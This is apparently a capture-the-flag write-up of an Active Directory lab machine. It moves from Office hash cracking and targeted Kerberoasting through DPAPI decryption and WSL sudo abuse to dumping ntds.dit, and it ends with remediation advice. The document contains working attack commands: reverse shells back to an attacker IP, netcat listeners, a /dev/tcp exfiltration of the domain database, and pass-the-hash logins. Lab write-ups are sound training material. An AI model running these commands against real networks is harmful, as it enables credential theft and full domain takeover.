|Property|Value|
|---|---|
|**OS**|Windows|
|**Difficulty**|Medium|
|**Release Date**|2025-07-05|
|**State**|Active|
|**IP**|10.129.232.130|
|**Techniques**|Kerberos-only SMB, Office hash cracking, targeted Kerberoasting, deleted-object restore, DPAPI secret decryption, WSL SSH, sudo abuse, ntds.dit extraction|
|**Tags**|#ad #windows #privesc #kerberos #dpapi #wsl|

---

## Summary

Voleur is a medium Windows machine built around Active Directory, started with credentials for `ryan.naylor`. SMB only accepts Kerberos authentication, so a ticket is obtained first. A password-protected spreadsheet found on the `IT` share is cracked offline and discloses a spreadsheet of staff, notes and a handful of plaintext service-account passwords. One of those accounts, `svc_ldap`, can write the `servicePrincipalName` of other users, which is abused to run a targeted Kerberoast attack against `svc_winrm`. Its hash cracks, granting WinRM access and the user flag.

From there, `svc_ldap` is used to restore a previously deleted user, `todd.wolfe`, whose leaked password unlocks a DPAPI-protected Windows credential blob containing `jeremy.combs`'s password. `jeremy.combs` in turn has access to a plaintext SSH private key for `svc_backup`, a Linux (WSL) account running alongside the Windows install on a non-standard SSH port. `svc_backup` can run anything as root via `sudo`, and from that root shell a Windows Backup of the domain (`ntds.dit` + `SYSTEM` hive) is found sitting on the C: drive. Dumping it offline with `secretsdump` recovers every domain hash, including `Administrator`, completing the domain compromise.

---

## Initial Credentials

```
ryan.naylor / HollowOct31Nyt
```

---

## Enumeration

### Nmap Scan

```
sudo nmap -sV -sC voleur.htb --open
Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.030s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 03:47:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m01s
```

The standard AD port set is present (DNS, Kerberos, LDAP, SMB, RPC, WinRM), plus one odd detail: an **OpenSSH server for Linux running on port 2222**. Nmap's own OS fingerprint already hints at it — `OSs: Windows, Linux` — which turns out to mean the domain controller is also running a Linux subsystem (WSL) alongside Windows. That becomes relevant much later.

There's also an 8-hour clock skew between the attacker box and the target, which will break Kerberos (it needs clocks within ~5 minutes) unless it's corrected.

### Kerberos Setup

SMB only accepts Kerberos authentication (NTLM is disabled), confirmed by trying NTLM login first:

```
nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
SMB  10.129.232.130  445  ... [-] 10.129.232.130\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

The clock is synced against the DC first:

```
sudo ntpdate voleur.htb
```

Then `/etc/krb5.conf` is set up for the domain:

```ini
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

A ticket is requested and exported for tool use:

```
kinit ryan.naylor@VOLEUR.HTB
export KRB5CCNAME=ryan.naylor.ccache
```

With a valid ticket, SMB access works:

```
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB  DC.voleur.htb  445  DC  [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB  DC.voleur.htb  445  DC  Share   Permissions  Remark
SMB  DC.voleur.htb  445  DC  ADMIN$
SMB  DC.voleur.htb  445  DC  C$
SMB  DC.voleur.htb  445  DC  Finance
SMB  DC.voleur.htb  445  DC  HR
SMB  DC.voleur.htb  445  DC  IPC$     READ
SMB  DC.voleur.htb  445  DC  IT       READ
SMB  DC.voleur.htb  445  DC  NETLOGON READ
SMB  DC.voleur.htb  445  DC  SYSVOL   READ
```

### User Enumeration

```
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
```

```
Administrator   Built-in account for administering the computer/domain
Guest
krbtgt          Key Distribution Center Service Account
ryan.naylor     First-Line Support Technician
marie.bryant    First-Line Support Technician
lacey.miller    Second-Line Support Technician
svc_ldap
svc_backup
svc_iis
jeremy.combs    Third-Line Support Technician
svc_winrm
```

11 users total, split between support staff and service accounts.

### Writable Objects

```
bloodyAD --host DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./ryan.naylor.ccache get writable
```

As `ryan.naylor` nothing interesting shows up beyond write access to his own object, so the next step is looking at what's actually reachable on SMB.

### Access_Review.xlsx

Browsing the `IT` share:

```
smbclient -k //DC.voleur.htb/IT
smb: \> cd IT
smb: \> cd "First-Line Support"
smb: \First-Line Support\> ls
  Access_Review.xlsx    A    16896  Thu Jan 30 09:14:25 2025
smb: \First-Line Support\> get Access_Review.xlsx
```

The spreadsheet is password-protected. The hash is extracted with `office2john`:

![](./screens/1.png)

```
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

Cracked instantly against `rockyou.txt`:

```
john access_review.hash --wordlist=/usr/share/wordlists/rockyou.txt
football1        (?)
```

![](./screens/2.png)

Opening the decrypted file:

![](./screens/3.png)

|User|Job Title|Permissions|Notes|
|---|---|---|---|
|Ryan.Naylor|First-Line Support Technician|SMB|Has Kerberos Pre-Auth disabled temporarily to test legacy systems.|
|Marie.Bryant|First-Line Support Technician|SMB||
|Lacey.Miller|Second-Line Support Technician|Remote Management Users||
|**Todd.Wolfe**|Second-Line Support Technician|Remote Management Users|Leaver. Password was reset to `NightT1meP1dg3on14` and account deleted.|
|Jeremy.Combs|Third-Line Support Technician|Remote Management Users|Has access to Software folder.|
|Administrator|Administrator|Domain Admin|Not to be used for daily tasks!|
|svc_backup||Windows Backup|Speak to Jeremy!|
|svc_ldap||LDAP Services|P/W: `M1XyC9pW7qT5Vn`|
|svc_iis||IIS Administration|P/W: `N5pXyW1VqM7CZ8`|
|svc_winrm||Remote Management|Need to ask Lacey as she reset this recently.|

This single file is the key that opens the whole box: it hands over `svc_ldap`'s password directly, and flags a deleted user (`todd.wolfe`) with a known password that will matter later.

### BloodHound

```
sudo ntpdate DC.voleur.htb && sudo -E bloodhound-python -k -u ryan.naylor -ns 10.129.232.130 -d voleur.htb -c all --zip -no-pass
```

Ingesting the data and checking `svc_ldap`'s outbound edges shows the real win:

![](./screens/4.png)

`svc_ldap` holds `WriteSPN` over `svc_winrm`, and is a member of a `RESTORE_USERS` group that has `GenericWrite` over `lacey.miller` and over the `Second-Line Support Technicians` OU as a whole — the latter is what will later allow restoring `todd.wolfe`.

---

## Foothold

### Targeted Kerberoasting

`WriteSPN` means `svc_ldap` can set an arbitrary `servicePrincipalName` on another account, making it kerberoastable on demand even though it isn't a service account by default. Using `svc_ldap`'s recovered password, [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) sets an SPN, requests a TGS for it, and removes the SPN again:

```
python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -k --no-pass --dc-ip 10.129.232.130 --dc-host DC.voleur.htb
```

Hashes come back for both `lacey.miller` and `svc_winrm`. Only `svc_winrm`'s cracks:

```
hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*svc_winrm$...:AFireInsidedeOzarctica980219afi
```

Credentials recovered: `svc_winrm:AFireInsidedeOzarctica980219afi`

### Exploitation

```
impacket-getTGT -dc-ip 10.129.232.130 voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i DC.voleur.htb -r voleur.htb
```

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```

---

## User Flag

```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
131305f89e46111ca31de2ad19bd707d
```

---

## Lateral Movement

### svc_ldap → Restoring todd.wolfe

Checking what `svc_ldap` can write confirms the deleted `todd.wolfe` object is reachable and restorable:

```
bloodyAD --host DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_ldap.ccache get writable
```

```
distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE
```

> **Note:** `bloodyAD`'s `set restore` module reported success here but actually wiped the object from the domain entirely instead of restoring it (seems to be a tool bug) — the box had to be reset. `Restore-ADObject` from a PowerShell session as `svc_ldap` worked cleanly instead, so that's the path documented below.

A session as `svc_ldap` is obtained by uploading `RunasCs` from the existing `svc_winrm` WinRM shell and launching a new process as `svc_ldap` with its cracked password:

```
*Evil-WinRM* PS> upload RunasCs.exe
*Evil-WinRM* PS> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.74:443
```

```
rlwrap -cAr nc -lnvp 443
PS C:\Windows\system32> whoami
voleur\svc_ldap
```

The deleted object is located and restored:

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```

```
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

```powershell
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

`todd.wolfe` is now a normal AD user again, with the password disclosed earlier in the spreadsheet (`NightT1meP1dg3on14`). A shell is spawned as him with `RunasCs`:

```
PS C:\tmp> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
```

```
rlwrap -cAr nc -lvnp 4444
PS C:\Windows\system32> whoami
voleur\todd.wolfe
```

### todd.wolfe → jeremy.combs (DPAPI)

`todd.wolfe`'s old profile is still on disk under the IT share, archived rather than deleted:

```
PS C:\> cd "IT\Second-Line Support\Archived Users\todd.wolfe"
```

Inside `AppData\Roaming\Microsoft\Credentials` sits a saved Windows Credential blob, and under `AppData\Roaming\Microsoft\Protect\<SID>` the DPAPI master key that protects it:

```
PS ...\Credentials> ls
772275FAD58525253490A9B0039791D3

PS ...\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls
08949382-134f-4c63-b93c-ce52efc0aa88
```

DPAPI (Data Protection API) encrypts saved credentials with a per-user master key, which is itself encrypted with a key derived from the user's password. Having both files plus the password that unlocked the account is enough to decrypt the credential offline.

Both files are copied out over SMB to the attacker box:

```
net use \\10.10.15.74\share /user:test test
copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share\
```

### Decrypting the DPAPI Blob

The master key is decrypted using `todd.wolfe`'s password:

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
```

```
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

That key then decrypts the saved credential:

```
impacket-dpapi credential -key 0xd2832547... -file 772275FAD58525253490A9B0039791D3
```

```
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Credentials recovered: `jeremy.combs:qT3V9pLXyN7W4m`

```
PS C:\tmp> .\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.15.74:4445 --bypass-uac
```

```
rlwrap -cAr nc -lvnp 4445
PS C:\Windows\system32> whoami
voleur\jeremy.combs
```

### jeremy.combs → svc_backup (SSH / WSL)

`jeremy.combs`'s access, per the spreadsheet, is to the Third-Line Support folder. It contains an SSH private key sitting in plaintext, plus a note explaining why:

```
PS C:\IT\Third-Line Support> cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can
utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,
Admin
```

```
PS C:\IT\Third-Line Support> cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

This explains the earlier port 2222/SSH finding: the DC also runs a WSL (Windows Subsystem for Linux) instance, with its own SSH daemon, used for backup tooling. The key connects as `svc_backup`:

```
ssh -i id_rsa.key svc_backup@voleur.htb -p 2222
```

```
svc_backup@DC:~$ whoami
svc_backup
```

`sudo -l` shows unrestricted root access:

```
svc_backup@DC:~$ sudo -l
User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

```
svc_backup@DC:~$ sudo su
root@DC:~# whoami
root
```

Root inside WSL. Since WSL shares the same underlying filesystem as the Windows host (`/mnt/c/` is `C:\`), this is enough to reach everything on the box, including domain backups.

---

## Privilege Escalation

### Enumeration

The Third-Line Support folder, reachable via `/mnt/c`, contains a full backup of the domain's Active Directory database:

```
root@DC:/mnt/c/IT/Third-Line Support# ls
Backups  Note.txt.txt  id_rsa

root@DC:/mnt/c/IT/Third-Line Support# cd Backups
root@DC:.../Backups# ls
'Active Directory'   registry

root@DC:.../Backups# cd 'Active Directory'; ls
ntds.dit  ntds.jfm

root@DC:.../Backups# cd registry; ls
SECURITY  SYSTEM
```

`ntds.dit` is the database file that backs the entire domain — every user and computer account hash lives in it. Combined with the `SYSTEM` registry hive (needed to derive the boot key that decrypts it), this is equivalent to full domain compromise.

### Exploitation

The two files are exfiltrated over a raw TCP connection, caught with `nc`:

```
root@DC:/tmp# cat /tmp/ntds.dit > /dev/tcp/10.10.15.74/9001
root@DC:/tmp# cat /tmp/SYSTEM > /dev/tcp/10.10.15.74/9001
```

```
nc -lvnp 9001 > ntds.dit
nc -lvnp 9001 > SYSTEM
```

Dumped offline with `secretsdump`:

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:...:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\svc_backup:1107:...:f44fe33f650443235b2798c72027c573:::
...
```

Every account's NTLM hash is recovered, including `Administrator`. A Kerberos ticket is requested with it directly:

```
impacket-getTGT -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator
export KRB5CCNAME=Administrator.ccache
```

```
impacket-wmiexec voleur.htb/Administrator@DC.voleur.htb -k -no-pass
C:\> whoami
voleur\administrator
```

---

## Root Flag

```
c:\users\Administrator\Desktop>type root.txt
381c0591a11a10fcd50baaed2d4a3eaf
```

---

## Remediation

- **Plaintext/weak-password Office files on shares:** `Access_Review.xlsx` listed every staff password in plain sight and was protected only by a dictionary-crackable password. Sensitive credential inventories must never be stored as a password-protected document on a general file share; use a dedicated secrets manager with proper access control instead.
- **Deleted accounts kept recoverable with known passwords:** `todd.wolfe` was deleted but immediately restorable, with a password that was documented elsewhere. Tombstone retention and object recovery rights should be tightly scoped, and a leaver's credentials should always be invalidated, not just the account disabled/deleted.
- **Excessive `WriteSPN` / `GenericWrite` delegation:** `svc_ldap` could set SPNs on arbitrary accounts and had `GenericWrite` over an entire OU through group membership. Delegated AD rights should be reviewed with BloodHound regularly and scoped to the minimum needed for each service account's actual purpose.
- **DPAPI-protected secrets left on an archived profile:** A departed user's leftover `AppData` (credentials + master key) was still readable by other staff, letting an attacker fully decrypt a saved credential offline. Archived/leaver profiles should be purged of credential stores, not just relocated.
- **Plaintext SSH private key on a share:** `id_rsa` for `svc_backup` sat unencrypted and directly readable. Private keys must never be stored outside the owning account's own protected directory, and should be passphrase-protected at minimum.
- **Unrestricted `sudo` on a backup account:** `svc_backup`'s `(ALL) NOPASSWD: ALL` sudo rule gave instant root on the WSL instance, which shares the filesystem with the Windows host. Scope sudo rules to the specific backup commands required, never a blanket `ALL`.
- **AD database backup left world-reachable on C:\:** A full `ntds.dit` + `SYSTEM` backup sitting under a share-adjacent folder is equivalent to a complete domain compromise for anyone who reaches it. Store AD backups encrypted, off-host, and restrict access to dedicated backup infrastructure only.

---

## References

- [targetedKerberoast — SPN-based Targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast)
- [Impacket — dpapi.py (Credential/Masterkey decryption)](https://github.com/fortra/impacket)
- [Microsoft Learn — DPAPI Overview](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [Microsoft Learn — Active Directory Object Restore (`Restore-ADObject`)](https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject)
- [Windows Subsystem for Linux Documentation](https://learn.microsoft.com/en-us/windows/wsl/about)